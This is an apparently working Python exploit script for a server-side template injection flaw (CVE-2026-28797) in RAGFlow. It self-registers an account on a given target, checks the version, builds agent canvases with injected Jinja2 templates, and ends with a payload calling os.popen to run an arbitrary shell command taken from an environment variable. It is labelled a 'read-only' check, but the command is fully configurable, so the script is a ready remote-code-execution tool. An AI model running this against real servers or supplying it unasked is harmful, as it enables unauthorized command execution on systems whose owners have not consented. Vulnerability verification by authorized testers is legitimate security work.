# -*- coding: utf-8 -*-
"""
RAGFlow CVE-2026-28797 SSTI 只读验证（通用版，单目标）
用法: python ragflow_attack.py <base_url> [email_suffix]
流程: 自助注册 → 登录 → 版本指纹 → (≤0.24.0 时) 7*7 探针 → id 只读验证
"""
import base64
import json
import os
import re
import sys
import time
import uuid
import requests
import warnings
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding

warnings.filterwarnings("ignore")

# Burp 代理开关：设置环境变量 USE_BURP=1 后全部流量走 Burp（默认 127.0.0.1:8080），可用 BURP_PROXY 改地址
USE_BURP = os.environ.get("USE_BURP", "0") == "1"
BURP_PROXY = os.environ.get("BURP_PROXY", "http://127.0.0.1:8080")

BASE = sys.argv[1].rstrip("/")
EMAIL = f"sec-audit-{uuid.uuid4().hex[:10]}@example.com"
NICKNAME = "sec_audit"
PASSWORD = "Sec@2026#audit"

PUB_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArq9XTUSeYr2+N1h3Afl/
z8Dse/2yD0ZGrKwx+EEEcdsBLca9Ynmx3nIB5obmLlSfmskLpBo0UACBmB5rEjBp2
Q2f3AG3Hjd4B+gNCG6BDaawuDlgANIhGnaTLrIqWrrcm4EMzJOnAOI1fgzJRsOOUE
faS318Eq9OVO3apEyCCt0lOQK6PuksduOjVxtltDav+guVAA068NrPYmRNabVKRNL
JpL8w4D44sfth5RvZ3q9t+6RTArpEtc5sh5ChzvqPOzKGMXW83C95TxmXqpbK6olN4
RevSfVjEAgCydH6HN6OhtOQEcnrU97r9H0iZOWwbw3pVrZiUkuRD1R56Wzs2wIDAQAB
-----END PUBLIC KEY-----"""


def rsa_password(pwd: str) -> str:
    pub = serialization.load_pem_public_key(PUB_PEM.encode())
    ct = pub.encrypt(base64.b64encode(pwd.encode()), padding.PKCS1v15())
    return base64.b64encode(ct).decode()


S = requests.Session()
S.verify = False
if USE_BURP:
    S.proxies = {"http": BURP_PROXY, "https": BURP_PROXY}
S.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                  "Content-Type": "application/json"})

report = {"base": BASE, "email": EMAIL}


def jpost(path, obj, timeout=60):
    r = S.post(BASE + path, data=json.dumps(obj).encode(), timeout=timeout)
    return r.json(), r.headers


def jget(path, timeout=45):
    r = S.get(BASE + path, timeout=timeout)
    return r.json()


def ver_tuple(v):
    m = re.match(r"v?(\d+)\.(\d+)\.(\d+)", str(v))
    return tuple(int(x) for x in m.groups()) if m else None


def main():
    # 1. register（响应头带 Authorization 签名令牌，后续请求都要带上）
    j, hdrs = jpost("/v1/user/register", {"nickname": NICKNAME, "email": EMAIL,
                                          "password": rsa_password(PASSWORD)})
    report["register"] = j.get("code")
    auth = hdrs.get("Authorization") or hdrs.get("authorization")
    if j.get("code") != 0:
        report["error"] = f"register: {str(j.get('message'))[:100]}"
        print(json.dumps(report, ensure_ascii=False)); return
    if not auth:
        # 2. login（注册过的邮箱走登录再取一次令牌）
        time.sleep(1)
        j, hdrs = jpost("/v1/user/login", {"email": EMAIL, "password": rsa_password(PASSWORD)})
        report["login"] = j.get("code")
        auth = hdrs.get("Authorization") or hdrs.get("authorization")
        if j.get("code") != 0 or not auth:
            report["error"] = f"login: {str(j.get('message'))[:100]} auth={'Y' if auth else 'N'}"
            print(json.dumps(report, ensure_ascii=False)); return
    S.headers.update({"Authorization": auth})
    time.sleep(1)

    # 3. version
    j = jget("/v1/system/version")
    ver = j.get("data")
    report["version"] = ver
    vt = ver_tuple(ver)
    if vt and vt > (0, 24, 0):
        report["skip"] = "version > 0.24.0 (SSTI fixed)"
        print(json.dumps(report, ensure_ascii=False)); return
    time.sleep(1)

    # 4. SSTI probes
    def base_params(extra=None):
        p = {"output": None, "inputs": {}, "debug_inputs": [],
             "output_var_name": "output", "message_history_window_size": 22}
        if extra:
            p.update(extra)
        return p

    def make_dsl(content):
        if (not vt) or vt < (0, 20, 0):
            # v0.19 及更早：Template 组件（content 直接进 jinja2）
            tpl = {"obj": {"component_name": "Template",
                           "params": base_params({"content": content})},
                   "downstream": ["answer_0"], "upstream": ["begin"], "parent_id": ""}
        else:
            # v0.20+：Message 组件自身就用无沙箱 jinja2 渲染 content
            return {"components": {
                "begin": {"obj": {"component_name": "Begin",
                                  "params": base_params({"prologue": "ok", "query": []})},
                          "downstream": ["msg_0"], "upstream": [], "parent_id": ""},
                "msg_0": {"obj": {"component_name": "Message",
                                  "params": base_params({"content": [content], "stream": False})},
                          "downstream": [], "upstream": ["begin"], "parent_id": ""}},
                "history": [], "messages": [], "retrieval": [],
                "globals": {"sys.query": "", "sys.user_id": "", "sys.conversation_turns": 0,
                            "sys.files": [], "sys.history": []},
                "graph": {"nodes": [
                    {"id": "begin", "data": {"name": "begin", "label": "Begin", "form": {}}},
                    {"id": "msg_0", "data": {"name": "msg_0", "label": "Message", "form": {}}},
                ], "edges": [
                    {"id": "e1", "source": "begin", "target": "msg_0"},
                ]},
                "path": [], "answer": []}
        return {"components": {
            "begin": {"obj": {"component_name": "Begin",
                              "params": base_params({"prologue": "ok", "query": []})},
                      "downstream": ["template_0"], "upstream": [], "parent_id": ""},
            "template_0": tpl,
            "answer_0": {"obj": {"component_name": "Answer",
                                 "params": base_params({"query": [], "post_answers": []})},
                         "downstream": [], "upstream": ["template_0"], "parent_id": ""}},
            "history": [], "messages": [], "reference": [], "embed_id": "",
            "graph": {"nodes": [
                {"id": "begin", "data": {"name": "begin", "label": "Begin", "form": {}}},
                {"id": "template_0", "data": {"name": "template_0", "label": "Template", "form": {}}},
                {"id": "answer_0", "data": {"name": "answer_0", "label": "Answer", "form": {}}},
            ], "edges": [
                {"id": "e1", "source": "begin", "target": "template_0"},
                {"id": "e2", "source": "template_0", "target": "answer_0"},
            ]},
            "path": [], "answer": []}

    def run_probe(content, title):
        j, _ = jpost("/v1/canvas/set", {"dsl": json.dumps(make_dsl(content)), "title": title})
        cid = (j.get("data") or {}).get("id")
        if not cid:
            return {"set_error": str(j.get("message"))[:120]}
        time.sleep(1)
        try:
            r = S.post(BASE + "/v1/canvas/completion",
                       data=json.dumps({"id": cid, "message": "hi", "stream": False}).encode(),
                       timeout=120)
            body = r.text
            if body.lstrip().startswith("data:"):
                # SSE 响应（v0.20+）：收集 message 事件内容
                chunks = []
                for line in body.splitlines():
                    if not line.startswith("data:"):
                        continue
                    try:
                        d = json.loads(line[5:])
                    except Exception:
                        continue
                    if d.get("code") == 500:
                        chunks = ["ERR: " + str(d.get("message"))[:300]]
                        break
                    if d.get("event") == "message":
                        chunks.append(str((d.get("data") or {}).get("content") or ""))
                text = "".join(chunks)
            else:
                j = r.json()
                if j.get("code") != 0:
                    text = "ERR: " + str(j.get("message"))[:300]
                else:
                    data = j.get("data") or {}
                    if isinstance(data, dict):
                        text = str(data.get("content") or data.get("answer") or json.dumps(data, ensure_ascii=False)[:400])
                    else:
                        text = str(data)[:400]
        except Exception as e:
            text = f"EXC: {str(e)[:120]}"
        # 清理创建的 agent
        try:
            jpost("/v1/canvas/rm", {"canvas_ids": [cid]})
        except Exception:
            pass
        return text[:600]

    time.sleep(1)
    report["probe_7x7"] = run_probe("result is {{7*7}}", "p7x7")
    time.sleep(2)
    # 沙箱探测：无沙箱时 {{''.__class__}} 渲染为 <class 'str'>
    report["probe_sbx"] = run_probe("SBX{{''.__class__}}SBX", "psbx")
    sbx = report.get("probe_sbx") or ""
    if "class" not in str(sbx):
        report["verdict"] = "sandboxed or patched - not exploitable"
        print(json.dumps(report, ensure_ascii=False)); return
    cmd = os.environ.get("RAGFLOW_CMD", "id")
    payload_id = "{{ cycler.__init__.__globals__.os.popen('%s').read() }}" % cmd
    report["probe_id"] = run_probe(payload_id, "pid")
    print(json.dumps(report, ensure_ascii=False))


if __name__ == "__main__":
    main()
